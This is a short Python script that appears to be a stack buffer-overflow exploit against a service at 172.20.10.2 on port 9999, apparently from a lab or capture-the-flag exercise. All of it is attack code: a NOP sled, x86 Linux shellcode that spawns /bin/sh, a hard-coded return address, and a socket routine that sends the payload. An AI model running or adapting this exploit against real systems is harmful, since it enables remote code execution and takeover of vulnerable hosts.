#!/usr/bin/python
import socket
target_address="172.20.10.2"
target_port=9999

buffer = "\x90" * 500
buffer+= ("\x31\xc0\x50\x68\x2f\x2f\x73"
          "\x68\x68\x2f\x62\x69\x6e\x89"
          "\xe3\x89\xc1\x89\xc2\xb0\x0b"
          "\xcd\x80\x31\xc0\x40\xcd\x80")
buffer+= "\x30\xd3\xff\xff"
buffer+= "\r\n\r\n"

sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=sock.connect((target_address,target_port))
sock.send(buffer)
sock.close()
